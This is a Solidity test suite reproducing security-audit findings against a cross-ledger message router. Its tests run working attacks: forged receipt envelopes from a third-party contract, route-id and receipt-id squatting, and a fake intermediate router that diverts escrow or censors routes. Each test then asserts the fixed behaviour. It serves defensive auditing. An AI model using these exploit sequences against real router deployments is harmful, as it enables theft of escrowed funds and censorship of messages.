// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.28;

import {IClprService} from "@hiero-ledger/clpr/interfaces/IClprService.sol";
import {ClprRouter} from "@clprouter/ClprRouter.sol";
import {RouteTypes} from "@clprouter/libraries/RouteTypes.sol";
import {RouteCodec} from "@clprouter/libraries/RouteCodec.sol";
import {RouteLogic} from "@clprouter/libraries/RouteLogic.sol";
import {Caip} from "@clprouter/libraries/Caip.sol";
import {ThreeLedgerFixture} from "../../helpers/ThreeLedgerFixture.sol";
import {ClprMessenger, FakeRouter} from "./RouterAuditBase.sol";

/// @notice Router findings reproduced on three ledgers running the unchanged reference ClprService
///         (docs/audit/router-findings.md). Each `test_<ID>_...` asserts the SECURE behaviour, so it fails
///         until the finding is fixed. `DESIGN` tests run the exploit, assert today's behaviour, then skip.
contract RouterFindingsFlowTest is ThreeLedgerFixture {
    // ── helpers ────────────────────────────────────────────────────────────

    function _receiptId(bytes16 routeId, uint32 hop) internal pure returns (bytes16) {
        return bytes16(keccak256(abi.encodePacked(routeId, "receipt", hop)));
    }

    /// @dev A receipt envelope as a third party on ledger C would hand it to B's Router over chBC, naming
    ///      `reporter` (ledger C or B) as the receipt's origin.
    function _forgedReceiptEnvelope(
        address forger,
        string memory reporterLedger,
        address reporter,
        RouteTypes.Receipt memory r
    ) internal view returns (bytes memory) {
        RouteTypes.Envelope memory re;
        re.routeId = bytes16(keccak256(abi.encode("forged", r.routeId, r.status)));
        re.origin = RouteTypes.Endpoint(reporterLedger, abi.encodePacked(reporter));
        re.destination = RouteTypes.Endpoint(ID_A, abi.encodePacked(alice));
        re.hops = new RouteTypes.Hop[](3);
        re.hops[0] = _hop(C, chBC, connBC, 0, address(0));
        re.hops[0].router = abi.encodePacked(forger);
        re.hops[1] = _hop(B, chAB, connAB, 0, address(0));
        re.hops[2] = _hop(A, bytes32(0), bytes32(0), 0, address(0));
        re.hopIndex = 1;
        re.payloadType = RouteTypes.PayloadType.RECEIPT;
        re.routerVersion = 1;
        re.payload = RouteCodec.encodeReceipt(r);
        return RouteCodec.encodeEnvelope(re);
    }

    // ═════════════════════════════════════════════════════════════════════
    // H-01  Receipt-id squatting at the origin: delivered, then refunded
    // ═════════════════════════════════════════════════════════════════════

    /// @dev Receipt ids are keccak256(routeId, "receipt", hopIndex): known as soon as the route is sent. The
    ///      sender registers that id as a route id of its own on the origin Router with `send`. The honest
    ///      DELIVERED receipt then fails `_validateInbound` with RouteReplayed, the CLPR message is consumed
    ///      with APPLICATION_ERROR and nothing retries it. After deadline + grace `reclaim` refunds the escrow
    ///      although the destination application acted on the message.
    function test_H01_receiptIdSquatting_payeeIsPaidAfterDelivery() public {
        bytes16 id = _sendAs(alice, _request(1 ether), 1.1 ether);

        ClprRouter.SendRequest memory squat = _request(0);
        squat.routeId = _receiptId(id, 2); // DELIVERED receipt is reported by hop 2 (the destination)
        squat.payload = "squat";
        _sendAs(alice, squat, 0.03 ether);

        _settle();
        (bytes16 deliveredId,,,,,) = C.app.delivered(0);
        assertEq(deliveredId, id, "destination application acted on the route");

        vm.warp(block.timestamp + 2 hours + RECLAIM_GRACE);
        try A.router.reclaim(id) {} catch {}

        assertEq(uint8(_routeStatus(id)), uint8(ClprRouter.RouteStatus.DELIVERED), "H-01: DELIVERED receipt lost");
        assertEq(payee.balance, 1 ether, "H-01: payee not paid although the message was delivered");
    }

    // ═════════════════════════════════════════════════════════════════════
    // H-02  Receipt forgery on strict routes with an explicit receipt_path
    // ═════════════════════════════════════════════════════════════════════

    /// @dev With `routePrefix` set, RouteLogic.checkReceipt takes the reporter identity from the receipt
    ///      envelope's own `origin` field, which the sender of the envelope chooses freely, and never compares
    ///      the path the receipt travelled with the route's receipt_path. Any application on any ledger
    ///      peered with the first-hop ledger B can therefore inject a receipt into B's Router (B only checks
    ///      the immediately previous hop) that A accepts. Here: QUARANTINED before the route has even left A,
    ///      sending the sender's unused fee budget to the quarantine vault under a made-up case id.
    function test_H02_explicitReceiptPath_thirdPartyCannotForgeReceipt() public {
        ClprRouter.SendRequest memory req = _request(0);
        req.receiptPath = RouteLogic.reversePrefix(req.hops, 2);
        bytes16 id = _sendAs(alice, req, 0.03 ether);

        ClprMessenger mallory = new ClprMessenger(); // any contract on ledger C
        RouteTypes.Hop[] memory hops = req.hops;
        hops[0].router = abi.encodePacked(address(A.router));
        RouteTypes.Receipt memory r;
        r.routeId = id;
        r.status = RouteTypes.ReceiptStatus.QUARANTINED;
        r.hopIndex = 1;
        r.ledgerId = ID_B;
        r.reason = RouteTypes.Reason.BLACKLIST;
        r.caseId = keccak256("made-up case");
        r.contact = "mailto:mallory@example";
        r.routePrefix = new RouteTypes.Hop[](1);
        r.routePrefix[0] = hops[0];
        r.routeEdge = RouteLogic.edgeDigest(hops[1]);
        r.routeRest = RouteLogic.hopsCommitment(hops, 2);
        bytes memory forged = _forgedReceiptEnvelope(address(mallory), ID_B, address(B.router), r);
        mallory.send(IClprService(address(C.service)), chBC, connBC, abi.encodePacked(address(B.router)), forged);

        _relay(C, B, chBC); // B's Router accepts it as a receipt in transit and forwards it to A
        _relay(B, A, chAB);

        assertEq(uint8(_routeStatus(id)), uint8(ClprRouter.RouteStatus.PENDING), "H-02: forged receipt settled");
        assertEq(address(A.vault).balance, 0, "H-02: fee budget moved to the vault by a forged receipt");
    }

    /// @dev Same root cause, DELIVERED variant: a forged "delivered" with an attacker-chosen response hash
    ///      settles the route before the destination ever sees the message.
    function test_H02b_explicitReceiptPath_forgedDeliveredBeforeDelivery() public {
        ClprRouter.SendRequest memory req = _request(0);
        req.receiptPath = RouteLogic.reversePrefix(req.hops, 2);
        bytes16 id = _sendAs(alice, req, 0.03 ether);

        ClprMessenger mallory = new ClprMessenger();
        RouteTypes.Hop[] memory hops = req.hops;
        RouteTypes.Receipt memory r;
        r.routeId = id;
        r.status = RouteTypes.ReceiptStatus.DELIVERED;
        r.hopIndex = 2;
        r.ledgerId = ID_C;
        r.responseHash = keccak256("whatever mallory wants");
        r.routePrefix = new RouteTypes.Hop[](2);
        r.routePrefix[0] = hops[0];
        r.routePrefix[1] = hops[1];
        r.routeEdge = RouteLogic.edgeDigest(hops[2]);
        bytes memory forged = _forgedReceiptEnvelope(address(mallory), ID_C, address(C.router), r);
        mallory.send(IClprService(address(C.service)), chBC, connBC, abi.encodePacked(address(B.router)), forged);

        _relay(C, B, chBC);
        _relay(B, A, chAB);

        assertEq(C.app.deliveredCount(), 0);
        assertEq(uint8(_routeStatus(id)), uint8(ClprRouter.RouteStatus.PENDING), "H-02: forged DELIVERED settled");
    }

    // ═════════════════════════════════════════════════════════════════════
    // M-01  Route-id squatting on a downstream ledger
    // ═════════════════════════════════════════════════════════════════════

    /// @dev Route ids are global but each Router's replay set also holds ids of routes it originated. Anyone
    ///      on B who sees a route id (RouteSent on A, or a caller-chosen UETR) sends a route of their own from
    ///      B with that id before the bundle is relayed; the real route is then rejected at B as a replay.
    function test_M01_routeIdSquattingDownstream_cannotCensorRoute() public {
        bytes16 id = _sendAs(alice, _request(1 ether), 1.1 ether);

        address mallory = makeAddr("mallory");
        vm.deal(mallory, 1 ether);
        ClprRouter.SendRequest memory squat;
        squat.destination = RouteTypes.Endpoint(C.id, abi.encodePacked(address(C.app)));
        squat.recipient = Caip.account(C.id, address(C.app));
        squat.hops = new RouteTypes.Hop[](2);
        squat.hops[0] = _hop(B, chBC, connBC, 0, address(0));
        squat.hops[1] = _hop(C, bytes32(0), bytes32(0), 0, address(0));
        squat.constraints.deadline = uint64(block.timestamp + 1 hours);
        squat.routeId = id;
        vm.prank(mallory);
        B.router.send(squat);

        _settle();
        assertEq(uint8(_routeStatus(id)), uint8(ClprRouter.RouteStatus.DELIVERED), "M-01: route censored by squatter");
    }

    // ═════════════════════════════════════════════════════════════════════
    // M-03  (DESIGN) Loose routes: any third party can forge any receipt
    // ═════════════════════════════════════════════════════════════════════

    /// @dev A loose route stores no hop commitment, so the origin accepts any receipt that its first-hop
    ///      Router relays, and that Router relays receipts from anyone. No value is at stake (loose routes
    ///      carry none) but the status, reason, case id and response hash reported to the sender (event and
    ///      onRouteReceipt) are attacker-chosen.
    function test_M03_DESIGN_looseRoute_thirdPartyForgesStatus() public {
        ClprRouter.SendRequest memory req = _request(0);
        req.constraints.loose = true;
        req.hops[0].fee = 0;
        req.hops[1].fee = 0;
        vm.prank(address(A.app));
        bytes16 id = A.router.send(req);

        ClprMessenger mallory = new ClprMessenger();
        RouteTypes.Receipt memory r;
        r.routeId = id;
        r.status = RouteTypes.ReceiptStatus.QUARANTINED;
        r.hopIndex = 2;
        r.caseId = keccak256("made-up case");
        bytes memory forged = _forgedReceiptEnvelope(address(mallory), ID_C, address(mallory), r);
        mallory.send(IClprService(address(C.service)), chBC, connBC, abi.encodePacked(address(B.router)), forged);
        _relay(C, B, chBC);
        _relay(B, A, chAB);

        // Today: the forged status is final and reported to the sender application.
        assertEq(uint8(_routeStatus(id)), uint8(ClprRouter.RouteStatus.QUARANTINED));
        (, uint8 st,, bytes32 cid,) = A.app.receipts(0);
        assertEq(st, uint8(ClprRouter.RouteStatus.QUARANTINED));
        assertEq(cid, keccak256("made-up case"));
        vm.skip(true, "M-03 design: loose-route receipts are unauthenticated; see router-findings.md");
    }

    // ═════════════════════════════════════════════════════════════════════
    // M-04  (DESIGN) Sender-chosen intermediate Router decides the settlement
    // ═════════════════════════════════════════════════════════════════════

    /// @dev Nothing ties `hops[i].router` to a canonical Router deployment. A sender names a contract it
    ///      controls as hop 1: it forwards honestly (the destination delivers, because the next Router only
    ///      checks that the CLPR sender equals hops[1].router) and reports FAILED to the origin. The receipt
    ///      matches the stored commitment, so the escrow goes back to the sender. Only a reactive committee
    ///      disable of that Router deployment helps.
    function test_M04_DESIGN_fakeIntermediateRouter_refundsSenderAfterDelivery() public {
        FakeRouter fake = new FakeRouter(IClprService(address(B.service)), ID_B);
        ClprRouter.SendRequest memory req = _request(1 ether);
        req.hops[1].router = abi.encodePacked(address(fake));
        uint256 aliceBefore = alice.balance;
        bytes16 id = _sendAs(alice, req, 1.1 ether);

        _relay(A, B, chAB);
        fake.pump();
        _relay(B, C, chBC); // C delivers to the application
        _relay(B, A, chAB); // the fake FAILED receipt settles the route

        assertEq(C.app.deliveredCount(), 1, "destination acted on the message");
        assertEq(uint8(_routeStatus(id)), uint8(ClprRouter.RouteStatus.FAILED));
        assertEq(payee.balance, 0, "payee not paid");
        assertEq(alice.balance, aliceBefore - 0.01 ether, "sender got the escrow back; only hop 0 fee spent");
        vm.skip(true, "M-04 design: no canonical-Router check; see router-findings.md");
    }

    // ═════════════════════════════════════════════════════════════════════
    // L-01  A disable at the origin drops a DELIVERED receipt for good
    // ═════════════════════════════════════════════════════════════════════

    /// @dev Receipts arriving over a disabled inbound edge / ledger / Router are dropped (`_stop` on a receipt
    ///      only emits ReceiptUndeliverable). The disable lapses after 7 days but the receipt is gone, so a
    ///      route whose destination already acted can only be reclaimed by the sender.
    function test_L01_disabledInboundAtOrigin_receiptIsHeldNotDropped() public {
        bytes16 id = _sendAs(alice, _request(1 ether), 1.1 ether);
        _relay(A, B, chAB);
        _relay(B, C, chBC);
        _relay(C, B, chBC); // DELIVERED receipt now on its way B -> A
        assertEq(C.app.deliveredCount(), 1);

        _apply(A.registry, A_DISABLE, _disablePayload(2, Caip.ledgerKey(ID_B)));
        _settle();
        vm.warp(block.timestamp + DISABLE_LAPSE + 1);
        _settle();

        assertEq(uint8(_routeStatus(id)), uint8(ClprRouter.RouteStatus.DELIVERED), "L-01: delivered receipt dropped");
    }
}
